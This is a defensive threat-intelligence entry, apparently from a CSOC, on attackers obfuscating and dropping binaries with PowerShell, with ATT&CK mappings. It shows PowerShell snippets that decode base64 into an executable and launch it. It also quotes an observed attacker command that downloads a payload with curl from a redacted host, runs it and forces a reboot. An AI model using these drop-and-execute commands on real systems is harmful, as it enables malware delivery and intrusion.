# Obfuscate binaries through PowerShell commands

## Metadata

- **UUID**: `a3df7d01-5fd9-4522-8eaf-f28895046b7d`
- **Schema**: `threat::1.0`
- **Version**: `1`
- **Created**: `2025-06-12`
- **Modified**: `2025-06-18`
- **TLP**: clear (`TLP:CLEAR`)
- **Organisation**: EC DIGIT CSOC (`56b0a0f0-b0bc-47d9-bb46-02f80ae2065a`)

## References
### Public
- **1**: [https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets](https://www.sentinelone.com/labs/follow-the-smoke-china-nexus-threat-actors-hammer-at-the-doors-of-top-tier-targets)
- **2**: [https://convert.readthedocs.io/en/latest/functions/ConvertTo-Base64](https://convert.readthedocs.io/en/latest/functions/ConvertTo-Base64)
- **3**: [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
- **4**: [https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.5](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.5)

## Description
Obfuscating binaries through PowerShell commands is a technique
used to make it difficult for reverse engineers, malware analysts,
or security researchers to understand the purpose and behavior of
a binary or script. This is often used by attackers to evade
detection and analysis.  

### Some of the methods for binary obfuscation

- ConvertTo-Base64: Converts a string to a Base64-encoded string.
- Compress-Archive: Compresses a file or folder using Gzip.
- Invoke-Expression: Executes a string as a PowerShell expression,
allowing for dynamic code execution.
- Add-Type: Loads a .NET assembly, which can be used to execute
code dynamically.
- Reflection.Assembly: Loads a .NET assembly using reflection.

For more information, an examples are given in the ref [2], [3], [4].

### A process for base64 encoded binary 

Usually a base64 encoded binary dropped to a computer is achieved
via a sequence of PowerShell (PS) commands.

An example for such pattern is represented in several steps below:

1. Base64 encoding

Like a first step, a binary (an executable file, for instance) is encoded 
in base64. This encoding scheme is used to represent binary data in an ASCII
string format. This is often done to bypass security controls that might
block or inspect binary data but allow text.

2. Dropping the encoded binary

The base64 encoded string is then "dropped" onto the target computer.
This could be done through various means, such as being embedded in a script,
sent via email, or included in a malicious document that executes PowerShell
commands when opened.

3. Decoding the binary in PowerShell

Once the encoded string is on the target system, PowerShell can be used to
decode it. The [System.Convert]::FromBase64String() method in PowerShell is
used for this purpose.

Example for PowerShell obfuscation code

```
encodedString = "YOUR_BASE64_ENCODED_STRING_HERE"
$decodedBytes = [System.Convert]::FromBase64String($encodedString)
```

4. Saving the decoded Binary to a file

After decoding, the binary needs to be saved to a file. This can
be done using the [System.IO.File]::WriteAllBytes() method:

```
$path = "C:\Path\To\Save\YourFile.exe"
[System.IO.File]::WriteAllBytes($path, $decodedBytes)

```
5. Executing the binary

Finally, the saved binary can be executed. One of the methods in which
the threat actors can do this is directly from PowerShell or through
other means such as creating a shortcut or using other scripts.

Example:

```
Start-Process -FilePath $path
```

 Another example for binary obfuscation through PowerShell commands
 is shown in Chinese-linked cluster threat actor campaign ref [1].  
 
 The threat actor group is observed to obfuscate binaries (in particular
 AppSov.exe) using PowerShell commands.  

 The threat actor deployed AppSov.exe by executing a PowerShell command
 that performs the following actions:

 - A threat actor downloads a binary file named from a remote endpoint
 using the utility curl.exe
 - After they save the downloaded file as `AppSov.exe` in the
 `C:\ProgramData\` directory.
 - Launches the executable using the `Start-Process` PowerShell command.
 - System reboot after some period of time. ref [1].      

 An example for used command:

 ```
 sleep 60;curl.exe -o c:\programdata\AppSov.EXE http://[REDACTED]/dompdf/x.dat;start-process c:\programdata\AppSov.EXE;sleep 1800;shutdown.exe -r -t 1 -f;
 
 ```

## Criticality
**Medium** - A Medium priority incident may affect public health or safety, national security, economic security, foreign relations, civil liberties, or public confidence.

## Terrain
> **A threat actor needs an initially compromised end-point. 
Example: A threat actor is using Operational Relay Box (ORB)
network to gain an initial foothold and access to the victim's
environment ref [1].

Domains: Enterprise
Cve: CVE-2024-8963, CVE-2024-8190
Targets: Customer, Laptop, Workstations
Platforms: Windows**

## Threat Assessment
| Dimension | Assessment | Description |
| --- | --- | --- |
| Severity | Moderate incident | A cyber attack on a small organisation, or which poses a considerable risk to a medium-sized organisation, or preliminary indications of cyber activity against a large organisation or the government. |
| Impact | Impairement; Business disruption; Lose Capabilities | - |
| Leverage | Infrastructure Compromise; Elevation of privilege; Information Disclosure; Tampering | - |
| Viability | Likely | Probable (probably) - 55-80% |
| Kill Chain | Defense Evasion | Techniques an attacker may specifically use for evading detection or avoiding other defenses. |

## ATT&CK Techniques
| Technique | Name | Description |
| --- | --- | --- |
| `T1190` | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) | Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.  Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.(Citation: Recorded Future ESXiArgs Ransomware 2023)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Depending on the flaw being exploited, this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).  If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005)), exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.  Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)  For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25) |
| `T1027.013` | [Obfuscated Files or Information: Encrypted/Encoded File](https://attack.mitre.org/techniques/T1027/013) | Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.  This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.  The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.  For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File)   Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution. |
| `T1027.002` | [Obfuscated Files or Information: Software Packing](https://attack.mitre.org/techniques/T1027/002) | Adversaries may perform software packing or virtual machine software protection to conceal their code. Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)   Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses.(Citation: Awesome Executable Packing) |
| `T1059.001` | [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001) | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).  PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.  A number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)  PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014) |
